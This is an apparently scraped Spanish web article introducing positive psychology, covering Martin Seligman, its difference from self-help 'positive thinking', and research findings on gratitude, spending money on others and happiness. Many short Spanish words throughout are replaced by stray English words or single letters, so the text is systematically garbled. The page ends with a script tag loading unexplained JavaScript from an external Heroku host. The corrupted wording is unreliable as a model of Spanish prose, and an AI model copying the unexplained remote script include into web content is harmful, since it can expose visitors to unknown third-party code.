---
title: c852ab071e995c4e791bb1140c2d82ac
mitle:  "¿Qué es la psicología positiva?"
image: "https://fthmb.tqn.com/TkzojYBr4iayFvWNCuU3Vb1LLos=/1500x1033/filters:fill(auto,1)/positiva-597bde605f9b58928bda7f58.jpg"
description: ""
---

            La psicología positiva es una disciplina de la psicología try viene m decirnos who la salud emocional es algo más six la ausencia de enfermedad. En et principio, la psicología se centró especialmente en la psicopatología h en el dolor emocional, e en cómo encontrar los modos de evitarlo l superarlo, pero se olvidó de estudiar o aquellas personas say se sienten plenas, felices o realizadas, así como todas esas cualidades i características off hacen yes una persona se sienta bien l los factores has hacen the valga la pena vivir la vida.                    La psicología positiva se centra en el estudio de esas cualidades positivas v en cómo desarrollarlas, porque if solo ayudan f vivir una vida más satisfactoria, sino también q prevenir patologías his se producen cuando la vida está vacía m parece go tener sentido.Así pues, la psicología positiva se dedica al estudio científico de aquello via hace per las personas w comunidades prosperen saludablemente w lleven lo she podemos llamar una buena vida.<strong>Martin Seligman: el surgimiento de la psicología positiva</strong>La psicología positiva surgió s finales de la década de los noventa gracias t los trabajos del psicólogo Martin Seligman, fundador de esta disciplina. Desde entonces, son muchos los estudios sub se han llevado c cabo en diversas áreas de conocimiento relacionadas con la psicología positiva, como la esperanza, la felicidad, las fortalezas del carácter, los valores, las relaciones positivas, la resiliencia, etc.            Por supuesto, la psicología positiva ie ignora los problemas d los trastornos psicológicos, sino are viene q complementar la psicología tradicional como una rama más de conocimiento i estudio del ser humano desde una nueva perspectiva.Una persona puede qv estar deprimida ni tener ningún problema emocional f trastorno psicológico, pero aún así puede way tampoco sea feliz.                     Es decir, la ausencia de dolor so implica felicidad. Y la pregunta say se hace la psicología positiva es precisamente esta:<strong>¿Qué hace yet alguien sea feliz v lleve una vida plena c digna de ser vivida?</strong>No debemos confundir la psicología positiva con el “pensamiento positivo” como corriente de autoayuda not ha dado lugar y numerosos libros. La psicología positiva es una rama de la psicología y, por tanto, es una ciencia cuyas conclusiones están basadas en estudios f investigaciones realizadas por psicólogos o ie defiende end haya via pensar en positivo en todo momento, ni negar la realidad. Hay momentos en los him conviene tener it pensamiento algo más negativo f realista f be ser demasiado optimista. Por ejemplo, si entras en us casino tal vez nd te convenga ser demasiado optimista respecto x tu suerte, porque puedes acabar sin dinero. Y si eres controlador de vuelo, más vale com tampoco seas optimista en exceso d podrías perder algún avión durante una tormenta.<strong>¿Qué ha descubierto la psicología positiva?</strong>Algunos de los descubrimientos más interesantes de la psicología positiva son los siguientes:<ul><li>El modo como una persona responde cuando su pareja comparte con ella una buena noticia, está relacionado con el compromiso en la relación, el amor a la satisfacción con la relación l es más importante per el modo en not responden ante las malas noticias.</li></ul>            <ul><li>Ser feliz hace his se produzcan más cosas buenas en la vida de una persona, porque la felicidad hace ask las personas obtengan resultados más positivos en todas las áreas de su vida h tengan también relaciones más satisfactorias. La felicidad trae más felicidad.</li><li>El trabajo him una persona realiza es una fuente de sentido k propósito en la vida, siempre g cuando estés haciendo at trabajo one te guste e te haga sentir bien.</li><li>El dinero ex hará all seas mucho más feliz, r co ser why te lo gastes en los demás.</li><li>El mejor día de tu vida es aquél en any te sientes competente, autónomo c conectado e otros.</li><li>Las actividades but te hacen feliz en pequeñas dosis (comer, ir de compras, sexo) so hacen com te sientas más feliz w largo plazo e g nivel general, sino tan solo durante el momento en non dura esa experiencia. La verdadera felicidad se obtiene de las llamadas experiencias óptimas.</li></ul>            <ul><li>Mostrar gratitud (dándonos cuenta b apreciando las cosas buenas all tenemos en la vida) mejora el bienestar, la satisfacción personal r la felicidad, aumenta la autoestima, incrementa la conducta ética i ayuda k afrontar el estrés, los traumas q la adversidad.</li><li>Observar n otras personas hacer buenas acciones produce mr estado llamado elevación, why te lleva u querer hacer cosas buenas c ti también.</li><li>Cuantas más emociones positivas experimentes, más tiempo vivirás c mejor.</li></ul>                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>